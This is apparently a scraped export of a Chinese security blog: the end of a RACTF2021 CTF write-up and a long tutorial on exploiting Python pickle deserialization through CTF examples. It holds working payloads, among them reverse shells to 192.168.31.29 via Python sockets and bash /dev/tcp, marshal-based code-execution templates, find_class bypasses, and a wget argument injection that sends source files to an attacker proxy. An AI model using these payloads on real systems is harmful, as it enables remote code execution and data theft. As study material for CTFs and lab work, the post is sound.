serializer，规定了只读和只写的不同内容\n然后是views.py，当确认user登录状态之后，如果设置过secret将会展示出来\n直接用Get方式请求/api/secret/?format=json可以得到所有设置过的secret，理所当然的猜测id=1,owner=1的value=flag，但是value字段是只写而非只读的\n由于用的是django的rest framework，可以利用它的Ordering Filter功能来对这些json内容根据value来进行一个排序/api/secret/?ordering=value\u0026amp;format=json\n采用char-by-char的盲注方式，不断地重复设置secret-\u0026gt;以value排序-\u0026gt;如果位于id=1,owner=1的前面，并且下一次就位于它的后面，说明这是正确的字符-\u0026gt;修改secret，继续爆破下一个字符\nexp.py\nimport requests import json flag = \u0026#34;ractf\u0026#34; csrf_token = \u0026#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu\u0026#34; session_id = \u0026#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq\u0026#34; headers = { \u0026#34;Cookie\u0026#34;: f\u0026#34;csrftoken={csrf_token}; sessionid={session_id}\u0026#34;, \u0026#34;X-CSRFToken\u0026#34;: csrf_token } our_secret_id = 14 def update_secret(curr_flag): found_real_char = False for i in range(32, 127): payload = curr_flag + chr(i) json_payload = { \u0026#34;value\u0026#34;: payload } r = requests.post(\u0026#34;http://193.57.159.27:21627/api/secret/\u0026#34;, data=json_payload, headers=headers) # print(r.status_code) r = requests.get( \u0026#34;http://193.57.159.27:21627/api/secret/?ordering=value\u0026amp;format=json\u0026#34;, headers=headers) secrets = json.loads(r.text) for secret in secrets: if secret[\u0026#39;id\u0026#39;] == 1: found_real_char = True if secret[\u0026#39;id\u0026#39;] == our_secret_id: if found_real_char: return chr(i - 1) else: break return chr(i - 1) while True: next_char = update_secret(flag) flag += next_char print(\u0026#39;[+] Curr Flag:\u0026#39;, flag) ractf{data_exf1l_via_s0rt1ng_0c66de47}\n参考：wp1 wp2\nWeb/I\u0026rsquo;m a fun  Agent,\nDo you remember the firearms store case from last year? The one they were using as a secret communication platform?\nWell, we\u0026rsquo;ve located the servers for them, the issue is they\u0026rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we\u0026rsquo;ll need to gain shell access to their systems the good old way. They\u0026rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they\u0026rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.\nWe\u0026rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?\n 在/upload/content处可以上传video，特别的是上传处有个external\n用curl方式请求一下/etc/passwd，curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal\n之后尝试读源码（我没爆出来目录），之后的看wp了，我太菜\nractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}\n参考：wp\nOSINT/Triangles https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW\nMiscellaneous/Discord  Come join our Discord!\n ractf{so_here_we_are_again}\nMiscellaneous/Missing Tools  Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?\nUsername: ractf\nPassword: 8POlNixzDSThy\nNote: it may take a minute or more for your container to start depending on load\n 根据给出的信息ssh连入一个终端，可以发现很多的命令都被禁止了\n使用echo /usr/bin/* /bin/*可以查看能使用的命令还有哪些\n————先说一下简单的非预期解：echo *找到flag.txt，然后source flag.txt或者sh \u0026lt; flag.txt都能读出来\n而预期解使用的是split+re-sha256的方式。直接用sha256sum得到flag然后想强行暴力破解显然非常的不现实，但是split这个工具可以以固定的字节数来划分给定的文件，如果我们以很小的标尺来划分flag并进行sha256，那么这样得到的hash值就将非常有可能爆破出来，最后再把它们合起来就能得到最终的flag了（这里用3bytes划分）\n$ split -b 3 flag.txt $ echo * flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal $ sha256sum xa* df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa 582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac 569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad 7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae 618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj 56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal 到CrackStation一把梭\nractf{std0ut_1s_0v3rr4ted_spl1t_sha}\n 害，前几天状态莫名很差，之前报的几个周末的ctf甚至连签到都没签，复现也是一拖再拖，拖到环境都关完了，挺后悔的，是自己的问题。\n在反思和调整了，嗯。\n","date":"2021-08-18T17:07:55+08:00","permalink":"https://amiaaaz.github.io/2021/08/18/ractf2021-wp/","section":"posts","tags":["wp"],"title":"RACTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"序列化\u0026amp;反序列化 在python中有好几个内置模块都可以干序列化\u0026amp;反序列化这个事，比如json, pickle/cpickle, shelve, marshal，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。\npickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如\n None 、 True 和 False 整数、浮点数、复数 str、byte、bytearray 只包含可封存对象的集合，包括 tuple、list、set 和 dict 定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__ 属性值或 __getstate__() 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）  当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。\n对于一个Object，可以通过重写object.__reduce__()函数，使其被序列化时按照重写的方式进行；此函数会返回一个(callable, ([para1, para2, ...])[, ...])的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。\npickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。\n说到pickle不得不谈的是opcode，即PVM(python virtual machine)的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。\nimport pickle a={\u0026#39;1\u0026#39;: 1, \u0026#39;2\u0026#39;: 2} for i in range(4): print(f\u0026#39;ver_{i}\u0026#39;,pickle.dumps(a,protocol=i)) # python3输出 protocol\u0026lt;=5 ver_0: b\u0026#39;(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.\u0026#39; ver_1: b\u0026#39;}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_2: b\u0026#39;\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_3: b\u0026#39;\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.\u0026#39; ver_4: b\u0026#39;\\x80\\x04\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; ver_5: b\u0026#39;\\x80\\x05\\x95\\x11\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x94(\\x8c\\x011\\x94K\\x01\\x8c\\x012\\x94K\\x02u.\u0026#39; # python2输出 protocal\u0026lt;=2 ver_0: (dp0 S\u0026#39;1\u0026#39; p1 I1 sS\u0026#39;2\u0026#39; p2 I2 s. ver_1: }q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. ver_2: �\u0002}q(U\u00011q\u0001K\u0001U\u00012q\u0002K\u0002u. 0号版本序列化的结果看起来可读性很强 都是可视的字符，操作码也比较直接地暴露出来，重点关注几个：\n   Opcode Mnemonic Description     ( MARK Push a mark object onto the stack   S STRING string   I INT Push integer or bool; decimal string argument   l LIST build a list from topmost stack items   d DICT build a dict from stack items   } EMPTY_DICT Push empty dict   t TUPLE Build a tuple from topmost stack items   ) EMPTY_TUPLE Push empty tuple   c GLOBAL Push self.find_class(module, args); 2 string args   R REDUCE Apply callable to argtuple, both on stack   b BUILD call __setstate__ or __dict__.update()   i INST build \u0026amp; push class instance   o OBJ build \u0026amp; push class instance   . STOP Every pickle ends with STOP    使用**pickletools**可以将opcode转化为肉眼可读取的形式\nimport pickletools data=b\u0026#34;\\x80\\x03cbuiltins\\nexec\\nq\\x00X\\x13\\x00\\x00\\x00key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;q\\x01\\x85q\\x02Rq\\x03.\u0026#34; pickletools.dis(data) 0: \\x80 PROTO 3 2: c GLOBAL \u0026#39;builtins exec\u0026#39; 17: q BINPUT 0 19: X BINUNICODE \u0026#34;key1=b\u0026#39;1\u0026#39;\\nkey2=b\u0026#39;2\u0026#39;\u0026#34; 43: q BINPUT 1 45: \\x85 TUPLE1 46: q BINPUT 2 48: R REDUCE 49: q BINPUT 3 51: . STOP highest protocol among opcodes = 2 可以利用的方向\u0026amp;思路 pickle的应用场景其实很广泛\n 解析认证token, session时；参见：掌阅iReader某站Python漏洞挖掘（一个redis+python反序列化的栗子 可能将对象pickle后存储成磁盘文件 可能将对象pickle后在网络中传输 可能会通过参数传递给程序；参见：sqlmap的代码执行漏洞  这里说一下第一点，flask配合redis在服务端存储session（以pickle序列化形式进行存储），如果通过cookie进行请求session_id时，session种的内容就会被反序列化。理论上没问题，但如果出现redis的未授权访问，就可以通过自己设计恶意的session，然后再设置cookie去请求session时，我们自定的内容就会被反序列化，达到了rce的目的。\n构造反序列化的payload离不开__reduce__这个魔术方法（上文简单的提到过），它是新式类（内置类）特有的方法（关于更多python元类相关的知识可以参考stackoverflow的这篇帖子：What are metaclasses in Python?）\n————在python2有两种声明类的方式，并且它们实例化的对象性质是不同的\npython3中消除了两者的区别，表现为第二种\n回到关于__reduce__的问题，只要在新式类中定义一个 __reduce__ 方法，我们就能在序列化的使用让这个类根据我们在__reduce__ 中指定的方式进行序列化。指定的关键就在于该方法的返回值上：一个callable可调用的对象，一个是 ([para1, para2, ...])[, ...])，该对象所需的参数元组；最简单的例子是return (os.system, ('ls',))。__reduce__ 方法与opcode中的R指令码关系密切，可以说PVM的R指令码就是__reduce__的返回值的一个底层实现。\n此处上一个简单的小栗子 # shell.pickle cos system (S\u0026#39;/bin/sh\u0026#39; tR. 上面手写的opcode成功返回了sh的shell；而通过dumps和loads实现则是这样；我们执行的代码都在__reduce__中\n# py2 import pickle import os class A(object): def __reduce__(self): a = \u0026#39;/bin/sh\u0026#39; return (os.system,(a,)) a = A() test = pickle.dumps(a) print test pickle.loads(test) 也顺利返回了shell，很容易发现跟上面手写的opcode并无差异，而这个核心就是构造时的__reduce__函数的返回值，我们可以利用它来rce，反弹shell之类的。\n另一个反弹shell的小栗子 import pickle import os class A(object): def __reduce__(self): a = \u0026#34;\u0026#34;\u0026#34;python2 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;192.168.31.29\u0026#34;,8426));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;\u0026#34;\u0026#34;\u0026#34; return (os.system,(a,)) a=A() result = pickle.dumps(a) pickle.loads(result) # 或者最简单的手写opcode 不用特意构造class A() cos system (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; tR. 参考：Linux反弹shell（一）文件描述符与重定向 | Linux 反弹shell（二）反弹shell的本质\n  栗子1 - [DasCTF 0721] easyweb   之前写过了，在对session的处理时使用了pickle，我们可以构造恶意的session反弹shell；也没有特殊的过滤和限制，payload怎么写都行\n 用Marshal序列化任意代码对象 如果只在__reduce__中用-c参数执行代码的话，遇到一些自定函数 在格式上就会比较麻烦\n前面提到pickle不能序列化代码对象，来个实例\n# py2 import pickle def foo(): import os def fib(n): if n\u0026lt;=1: return n return fib(n-1)+fib(n-2) print \u0026#39;fib(10)=\u0026#39;,fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) pickle.dumps(foo.func_code) 但也不是绝路一条，Marshal可以让这段代码序列化\n# py2 import marshal import base64 def foo(): import os def fib(n): if n \u0026lt;= 1: return n return fib(n-1) + fib(n-2) print \u0026#39;fib(10) =\u0026#39;, fib(10) os.system(\u0026#39;/bin/sh\u0026#39;) code_serialized = base64.b64encode(marshal.dumps(foo.func_code)) print code_serialized # YwAAAAABAAAAAgAAAAMAAABzOwAAAGQBAGQAAGwAAH0AAIcAAGYBAGQCAIYAAIkAAGQDAEeIAABkBACDAQBHSHwAAGoBAGQFAIMBAAFkAABTKAYAAABOaf////9jAQAAAAEAAAAEAAAAEwAAAHMsAAAAfAAAZAEAawEAchAAfAAAU4gAAHwAAGQBABiDAQCIAAB8AABkAgAYgwEAF1MoAwAAAE5pAQAAAGkCAAAAKAAAAAAoAQAAAHQBAAAAbigBAAAAdAMAAABmaWIoAAAAAHMFAAAAdTIucHlSAQAAAAUAAABzBgAAAAABDAEEAXMIAAAAZmliKDEwKT1pCgAAAHMHAAAAL2Jpbi9zaCgCAAAAdAIAAABvc3QGAAAAc3lzdGVtKAEAAABSAgAAACgAAAAAKAEAAABSAQAAAHMFAAAAdTIucHl0AwAAAGZvbwMAAABzCAAAAAABDAEPBA8B 现在得到了序列化的字符串，我们希望它被反序列化时执行，但是直接将他放入__reduce__返回部分似乎并不可以，__reduce__是调用callable来执行参数之类的，而我们构造好的本身就是callable，希望它执行而不是作为另一个callable的参数；这时就需要直接从PVM操作码的层级进行构造了。\n————其实我觉得更通俗的理解是这样可以不把要执行的代码限制在return (os.system,(a,))这样式的框架中，而是可以自由的执行代码，或者说就是另一种形式的pker\n我们需要执行的其实是（利用到python oop的特性，通过types.FunctionTyle(func_code,globals(),’’)()来动态地创建匿名函数，参见：官方文档）\n(types.FunctionType(marshal.loads(base64.b64decode(code_enc)), globals(), \u0026#39;\u0026#39;))() 或者更可读一些\ncode_str = base64.b64decode(code_enc) code = marshal.loads(code_str) func = types.FunctionType(code, globals(), \u0026#39;\u0026#39;) func() 接下来就是手动构造opcode的时候了，回想之前返回一个简单的shell时的opcode\ncos system (S\u0026#39;/bin/sh\u0026#39; tR. 开头的c后面跟的是引入的模块，换行之后是函数，再换行之后是执行的语句；根据这个结构把marshal和b64加进去\ncmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtR 而globals()可以在__builtin__模块中引入\n{}{} c__builtin__ globals (tR 把上面的缝合起来得到最终的payload，注意添加(rR.\nctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;YwAAAAAB........\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR. 构造这个人看着费劲的payload的模板~（来源参见：Arbitrary code execution with Python pickles）\n# py2 import marshal import base64 def foo(): pass # Your code here print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) 用pickle执行一下那串payload看看效果\n成功返回了斐波那契数列的结果和一个shell\n原理都是一样的，也可以用Marshal+b64的方式反弹shell（用模板生成opcode\nimport marshal import base64 def foo(): import os a = \u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.31.29/8426 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; # print \u0026#39;hold on...\u0026#39; os.system(a) print \u0026#34;\u0026#34;\u0026#34;ctypes FunctionType (cmarshal loads (cbase64 b64decode (S\u0026#39;%s\u0026#39; tRtRc__builtin__ globals (tRS\u0026#39;\u0026#39; tR(tR.\u0026#34;\u0026#34;\u0026#34; % base64.b64encode(marshal.dumps(foo.func_code)) ————或者下面这个模板也可以达到上面的效果（执行代码 而不包含类和函数）（来源：pickle_compiler.py\ntry: import cPickle as pickle except ImportError: import pickle from sys import argv def picklecompiler(sourcefile): sourcecode = file(sourcefile).read() return \u0026#34;c__builtin__\\neval\\n(c__builtin__\\ncompile\\n(%sS\u0026#39;\u0026lt;payload\u0026gt;\u0026#39;\\nS\u0026#39;exec\u0026#39;\\ntRtR.\u0026#34; % (pickle.dumps( sourcecode )[:-4],) def usage(): print \u0026#39;\u0026#39;\u0026#39;usage: python %sfilename\u0026#39;\u0026#39;\u0026#39; % argv[0] if __name__ == \u0026#34;__main__\u0026#34;: if len(argv) == 2: print picklecompiler(argv[1]) else: usage() 工具二连 - 通过pker构造opcode 原理参见：通过AST来构造Pickle opcode - 自动化构造，利用了抽象语法树\npker会用到GLOBAL, INST, OBJ这三种特殊函数和一些必要的转换方式；下面是pker的简单小栗子（更多使用说明详见上面的链接）\n  全局变量覆盖\n  # 覆盖直接由执行文件引入secret模块中的name和category模块 ecret = GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;secret\u0026#39;) secret.name = \u0026#39;1\u0026#39; secret.category = \u0026#39;2\u0026#39;   # 覆盖引入模块的变量 game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = \u0026#39;123\u0026#39;     函数执行\n  # 通过b\u0026#39;R\u0026#39;调用 __reducce__方法 s = \u0026#39;whoami\u0026#39; system = GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;) system(s) return   # 通过b\u0026#39;i\u0026#39;调用 INST(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;whoami\u0026#39;)   # 通过b\u0026#39;c\u0026#39;和b\u0026#39;o\u0026#39;调用 OBJ(GLOBAL(\u0026#39;os\u0026#39;, \u0026#39;system\u0026#39;), \u0026#39;whoami\u0026#39;)   # 多参数调用函数 INST(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;[, param0, param1...]) OBJ(GLOBAL(\u0026#39;[module]\u0026#39;, \u0026#39;[callable]\u0026#39;)[, param0, param1...])     实例化对象（特殊的函数执行）\n  animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;,\u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = OBJ(GLOBAL(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;), \u0026#39;1\u0026#39;,\u0026#39;2\u0026#39;) return animal   animal = INST(\u0026#39;__main__\u0026#39;, \u0026#39;Animal\u0026#39;) animal.name=\u0026#39;1\u0026#39; animal.category=\u0026#39;2\u0026#39; return animal     先对题目有大概思路，然后辅以工具~好耶\n工具二连 - anapickle 其实一个年龄很大的脚本了，支持python2.3。。。。但是包含了很多payload，可以灵活运用~\nbypass!!! 对类型的检查 可以在已经构造好的opcode后面去掉.再续上相应的对象的opcode，作为栈顶的值供检查\n限制b'c'对模块的引入 - find_class()的重写 修改find_class()会引入函数\u0026amp;模块的白名单，一定程度上解决pickle的安全性问题；以下两种情况会调用find_class()的检查：\n opcode角度：出现c, i, b'\\x93'会调用 python角度：find_class()只会在解析opcode时调用一次，只要绕过opcode的执行过程，之后再产生的函数在黑名单中也不会拦截（比如通过__import__来绕过）  \u0026ndash;\u0026raquo;仅可以引入__main__开头的模块 “通过GLOBAL指令引入的变量可以看作是原变量的引用，我们在栈上修改它的值，也会修改原变量”，基于这一原理，当c指令只允许__main__时，我们可以引入__main__.blue（blue见题行事 上下文中会提前引入）这个module，再将一个dict压入栈，内容是{'name': 'rua', 'grade': 'www'}；之后执行BUILD指令，将会改写__main__.blue.name和 __main__.blue.grade，此时已经执行了我们想要的变量覆盖。之后弹掉栈顶，现在为空栈，拼接上正常的Student对象序列化后的opcode。此时的完整opcode在被反序列化时，栈顶是正常的Student对象，而被执行时却会先执行一遍前面的过程，造成变量覆盖。\n既然我们可以做到重写变量的值，那也可以将这个值改为read wrapper的返回值做到任意文件读取（详见后面的内容）\n\u0026ndash;\u0026raquo;仅可以引入题目中自设的模块\u0026amp;模块名不能有__符   栗子2 - [SUCTF 2019]Guess Game   本地复现还是失败，无解，docker地址-\u0026gt;https://github.com/rmb122/suctf2019_guess_game是个猜数游戏，交互逻辑在init.py, Game.py和Ticket.py中，10以内的数字需要猜对10次（全胜）才会返回flag\n然后是game_client.py\n接收数字的输入作为参数生成Ticket对象，序列化后发送到server端\n再看game_server.py，用了重写了的find_class()\n这个限制的意思是导入的模块只能以guess_name开头并且名字里没有__\n大概看完了流程，接下来找找突破口——序列化时是生成一个Ticket的实例\n判断输赢则是需要Game辅助\n结合game_server.py的判断条件，拿到flag需要self.win_count == max_round == 10\n那么构造的方向有了——修改相关参数做到变量覆盖，再以序列化的opcode形式传过去。手写opcode面临的问题就是重写find_class()后对加载指定模块的限制，而这里我们可以看到__init__.py中game = Game()，所以直接可以通过guess_game.game引入Game()类，然后修改类中的win_count和round_count就能做到变量覆盖；第二要注意必须手写opcode，如果是先from guess_name import game，然后修改参数后再dump，则是在运行时重新新建一个Game对象，就不是从guess_game这个module中获取，破坏上下文；第三要注意\npickle序列化流执行完会把栈顶的值返回，所以栈顶需要设为Ticket，这里可以dumps一个Ticket，然后拼到之前手写的opcode之后\nopcodes:\n# 修改win_count = 10和round_count = 9，传过去之后执行一次round_count += 1就能全胜 cguess_name game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb. # c之后是被find_class()监控的区域，拼接Ticket import socket import struct s = socket.socket() s.connect((\u0026#39;node4.buuoj.cn\u0026#39;, 28803)) exp = b\u0026#39;\u0026#39;\u0026#39;cguess_game game }S\u0026#34;win_count\u0026#34; I10 sS\u0026#34;round_count\u0026#34; I9 sbcguess_game.Ticket\\nTicket\\nq\\x00)\\x81q\\x01}q\\x02X\\x06\\x00\\x00\\x00numberq\\x03K\\x06sb.\u0026#39;\u0026#39;\u0026#39; s.send(struct.pack(\u0026#39;\u0026gt;I\u0026#39;, len(exp))) s.send(exp) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) print(s.recv(1024)) ————用pker\nticket = INST(\u0026#39;guess_game.Ticket\u0026#39;, \u0026#39;Ticket\u0026#39;, 0) game = GLOBAL(\u0026#39;guess_game\u0026#39;, \u0026#39;game\u0026#39;) game.curr_ticket = ticket return ticket # b\u0026#34;(I0\\niguess_game.Ticket\\nTicket\\np0\\n0cguess_game\\ngame\\np1\\n0g1\\n(N(S\u0026#39;curr_ticket\u0026#39;\\ng0\\ndtbg0\\n.\u0026#34;    栗子3 - [巅峰极客 2021]what_pickle   登录页面 任意密码均可登入，仅显示一张图片+登录时输入的密码；图片的url为/images?image=2.jpg，但是不能常规的目录穿越拿源码，当时做的时候就不会了，下面是复现\n/images可以看到开着的debug界面\n能看到部分的源码，这里的图片是用的wget命令来下载本地8080端口的/image图片，所以我们尝试wget命令注入将文件外带出来\n/images?image=\u0026amp;argv=--post-file=/app/app.py\u0026amp;argv=--execute=http_proxy=http://ip:port /images?image=\u0026amp;argv=—post-file=/app/app.py\u0026amp;argv=-e http_proxy=http://ip:port 依次读出/app/app.py和/app/config.py\n# app.py from flask import Flask, request, session, render_template, url_for,redirect import pickle import io import sys import base64 import random import subprocess from ctypes import cdll from config import SECRET_KEY, notadmin,user cdll.LoadLibrary(\u0026#34;./readflag.so\u0026#34;) app = Flask(__name__) app.config.update(dict( SECRET_KEY=SECRET_KEY, )) class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in [\u0026#39;config\u0026#39;] and \u0026#34;__\u0026#34; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(\u0026#34;global \u0026#39;%s.%s\u0026#39; is forbidden\u0026#34; % (module, name)) def restricted_loads(s): \u0026#34;\u0026#34;\u0026#34;Helper function analogous to pickle.loads().\u0026#34;\u0026#34;\u0026#34; return RestrictedUnpickler(io.BytesIO(s)).load() @app.route(\u0026#39;/\u0026#39;) @app.route(\u0026#39;/index\u0026#39;) def index(): if session.get(\u0026#39;username\u0026#39;, None): return redirect(url_for(\u0026#39;home\u0026#39;)) else: return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def login(): name = request.form.get(\u0026#39;username\u0026#39;, \u0026#39;\u0026#39;) data = request.form.get(\u0026#39;data\u0026#39;, \u0026#39;test\u0026#39;) User = user(name,data) session[\u0026#34;info\u0026#34;]=base64.b64encode(pickle.dumps(User)) return redirect(url_for(\u0026#39;home\u0026#39;)) @app.route(\u0026#39;/home\u0026#39;) def home(): info = session[\u0026#34;info\u0026#34;] User = restricted_loads(base64.b64decode(info)) Jpg_id = random.randint(1,5) return render_template(\u0026#39;home.html\u0026#39;,id = str(Jpg_id), info = User.data) @app.route(\u0026#39;/images\u0026#39;) def images(): command=[\u0026#34;wget\u0026#34;] argv=request.args.getlist(\u0026#39;argv\u0026#39;) true_argv=[x if x.startswith(\u0026#34;-\u0026#34;) else \u0026#39;--\u0026#39;+x for x in argv] image=request.args[\u0026#39;image\u0026#39;] command.extend(true_argv) command.extend([\u0026#34;-q\u0026#34;,\u0026#34;-O\u0026#34;,\u0026#34;-\u0026#34;]) command.append(\u0026#34;http://127.0.0.1:8080/\u0026#34;+image) image_data = subprocess.run(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE) return image_data.stdout if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, debug=True, port=80) # config.py SECRET_KEY=\u0026#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy\u0026#34; notadmin={\u0026#34;admin\u0026#34;:\u0026#34;no\u0026#34;} class user(): def __init__(self, username, data): self.username = username self.data = data def backdoor(cmd): if isinstance(cmd,list) and notadmin[\u0026#34;admin\u0026#34;]==\u0026#34;yes\u0026#34;: s=\u0026#39;\u0026#39;.join(cmd) eval(s) 这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数eval()\n# 用pker.py生成payload s=GLOBAL(\u0026#34;config\u0026#34;,\u0026#34;notadmin\u0026#34;) s[\u0026#34;admin\u0026#34;]=\u0026#34;yes\u0026#34; user=INST(\u0026#34;config\u0026#34;,\u0026#34;user\u0026#34;) user.username=\u0026#34;tyskill\u0026#34; user.data=\u0026#34;tyskill\u0026#34; door=INST(\u0026#34;config\u0026#34;,\u0026#34;backdoor\u0026#34;,[\u0026#34;__import__(\u0026#39;subprocess\u0026#39;).call(\\\u0026#34;echo -e \u0026#39;#!/bin/bash\\\\nsh -i \u0026gt;\u0026amp; /dev/tcp/you_vps_ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026gt;x \u0026amp;\u0026amp; bash x \u0026amp;\u0026amp; rm -rf x\\\u0026#34;,shell=True)\u0026#34;]) return user 然后base64.b64encode(data)加进session['info']中拿到shell\n看wp，后面的步骤好像还跟pwn有点关系，我对pwn毫无研究，不献丑了，指路两个wp-\u0026gt;wp1 | wp2\n \u0026ndash;\u0026raquo;仅可以引入builtins模块 更多知识参考：深入理解Python中的__builtin__和__builtins__ | [Python 的内建对象](https://www.jianshu.com/p/645e973 83c1f) | __builtins__ 与 __builtin__（builtins）\n  栗子4 - [Code-Breaking 2018] picklecode   本地复现还是失败，docker地址-\u0026gt;https://github.com/phith0n/code-breaking/tree/master/2018/picklecode（就跟被docker诅咒了一样 从来没有成功的用docker复现过一道题😭😭😭真就脑补出flag了\n审计源码，是一个django的项目（正好之前的实训做的就是django的项目，看源码轻松一些），主文件夹是core，有一个名为challenge的app\n看core下的settings.py比默认的配置多了54和55行\n用了特殊的SESSION_ENGINE和SESSION_SERIALIZER，前者指的是django将用户认证信息存储在哪里 后者指django用什么方式存储认证信息，也就相当于先经过SESSION_SERIAZLIZER指定的方式转换为字符串，再有SESSION_ENGINE指定的方式存储到某个地方。默认的django项目中，存储位置应该是django.contrib.sessions.backends.db，序列化方式应该是django.contrib.sessions.serializers.JSONSerializer；而这里就是用pickle序列化后的形式，加签名singed后存储在cookie中。那这里肯定要控制session，结合pickle来rce了；跟过去看看\n依旧是重写了find_class()方法，只有模块是内置的builtins（不需要import就可以用的）并且名字不能在黑名单中才可以；这里的绕过是第二个考点了，先翻回去看一下仅有的app的views.py\n模板部分直接拼接了request.user.username，这是注册时传入，有模板注入漏洞，找找调用链\n（因为本地环境太垃圾了 没复现 这里云做题了）在模板处下断点，可以看到很多的上下文变量，通常会存在的有request, user, perms，这里用的利用链是（注意django模板引擎无法读取下划线开头的属性）{{request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY}}，注册一个名为这个的用户即可获得签名的密钥。\n再掉头回去思考opcode的编写。重写find_class()之后限制很多，但通过builtins仍然可以用getattr()；那么就分两步走，先通过builtins.getattr('builtins, 